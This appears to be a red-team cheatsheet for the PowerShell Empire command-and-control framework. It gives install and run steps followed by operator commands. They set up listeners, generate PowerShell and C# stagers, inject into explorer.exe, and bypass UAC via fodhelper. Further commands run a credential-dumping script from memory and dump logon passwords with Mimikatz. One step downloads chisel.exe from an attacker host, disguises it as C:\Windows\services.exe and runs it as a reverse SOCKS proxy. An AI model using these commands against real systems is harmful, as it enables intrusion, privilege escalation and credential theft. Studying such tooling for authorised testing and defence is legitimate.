# Empire

## Empire

* ​[https://xakep.ru/2020/06/03/powershell-empire/](https://xakep.ru/2020/06/03/powershell-empire/)​

## Install <a href="#install" id="install"></a>

* ​[https://github.com/BC-SECURITY/Empire](https://github.com/BC-SECURITY/Empire)​

```
$ git clone --recursive https://github.com/BC-SECURITY/Empire.git$ cd Empire$ sudo ./setup/install.sh$ sudo poetry install
```

To compile C# agents ([Covenant](https://github.com/cobbr/Covenant) and [Sharpire](https://github.com/0xbadjuju/Sharpire)) [install](https://docs.microsoft.com/en-us/dotnet/core/install/linux-debian#supported-distributions) .NET SDK 3.1:

```
$ wget https://packages.microsoft.com/config/debian/10/packages-microsoft-prod.deb -O packages-microsoft-prod.deb$ sudo dpkg -i packages-microsoft-prod.deb$ rm packages-microsoft-prod.deb​$ sudo apt-get update; \  sudo apt-get install -y apt-transport-https && \  sudo apt-get update && \  sudo apt-get install -y dotnet-sdk-3.1​$ sudo apt-get update; \  sudo apt-get install -y apt-transport-https && \  sudo apt-get update && \  sudo apt-get install -y aspnetcore-runtime-3.1
```

## Run <a href="#run" id="run"></a>



```
$ ./ps-empire server [--restip 127.0.0.1 --username snovvcrash --password 'Passw0rd!']$ ./ps-empire client
```

Reset the database:

```
$ ./ps-empire server --reset
```

## Cheatsheet <a href="#cheatsheet" id="cheatsheet"></a>

Prepare a listener:

```
(Empire) > listeners(Empire: listeners) > uselistener http(Empire: uselistener/http) > set Name http1(Empire: uselistener/http) > set Host 10.10.13.37(Empire: uselistener/http) > set Port 80(Empire: uselistener/http) > execute
```

Generate a PowerShell stager:

```
(Empire: listeners) > usestager multi/launcher(Empire: usestager/multi/launcher) > set Listener http1(Empire: usestager/multi/launcher) > set OutFile pwsh.ps1(Empire: usestager/multi/launcher) > generate
```

Generate a C# stager:

```
(Empire: listeners) > useplugin csharpserver(Empire: useplugin/csharpserver) > set status start(Empire: useplugin/csharpserver) > execute(Empire: useplugin/csharpserver) > usestager windows/csharp_exe(Empire: usestager/windows/csharp_exe) > set Listener http1(Empire: usestager/windows/csharp_exe) > set OutFile csharp.exe(Empire: usestager/windows/csharp_exe) > generate
```

Re-inject into an interactive process (e.g., `explorer.exe`):

```
(Empire: listeners) > agents(Empire: agents) > rename LKH7SD3V A1(Empire: agents) > interact A1(Empire: A1) > sysinfo(Empire: A1) > shell Get-Process explorer(Empire: A1) > psinject exch <EXPLORER_EXE_PID>
```

Bypass UAC to get a high integrity process:

```
(Empire: A1) > shell whoami /priv(Empire: A1) > usemodule privesc/bypassuac_fodhelper(Empire: powershell/privesc/bypassuac_fodhelper) > set Listener http1(Empire: powershell/privesc/bypassuac_fodhelper) > run
```

Execute a PowerShell script from memory (e.g., [`Invoke-SharpSecDump.ps1`](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpSecDump.ps1)):

```
(Empire: A1) > shell whoami /priv(Empire: A1) > usemodule management/invoke_script(Empire: powershell/management/invoke_script) > set ScriptPath /home/snovvcrash/tools/dump.ps1(Empire: powershell/management/invoke_script) > set ScriptCmd Invoke-SharpSecDump -C "-tager=127.0.0.1"(Empire: powershell/management/invoke_script) > run
```

Start a process in the background (e.g., [chisel](https://github.com/jpillora/chisel) SOCKS proxy):

```
(Empire: A1) > shell IWR http://10.10.13.37:8080/chisel.exe -OutFile C:\Windows\services.exe -UseBasicParsing(Empire: A1) > shell Start-Process -NoNewWindow -FilePath C:\Windows\services.exe -ArgumentList "client 10.10.13.37:8000 R:socks"
```

Invoke a custom Mimikatz command:

```
(Empire: A1) > usemodule credentials/mimikatz/command(Empire: powershell/credentials/mimikatz/command) > set Command '"privilege::debug" "token::elevate" "ts::logonpasswords" "exit"'(Empire: powershell/credentials/mimikatz/command) > run
```

## Plugins <a href="#plugins" id="plugins"></a>

* ​[https://github.com/BC-SECURITY/SocksProxyServer-Plugin](https://github.com/BC-SECURITY/SocksProxyServer-Plugin)​
* ​[https://github.com/BC-SECURITY/ChiselServer-Plugin](https://github.com/BC-SECURITY/ChiselServer-Plugin)​

## Customizing Agents <a href="#customizing-agents" id="customizing-agents"></a>

* ​[https://s3cur3th1ssh1t.github.io/Customizing\_C2\_Frameworks/](https://s3cur3th1ssh1t.github.io/Customizing\_C2\_Frameworks/)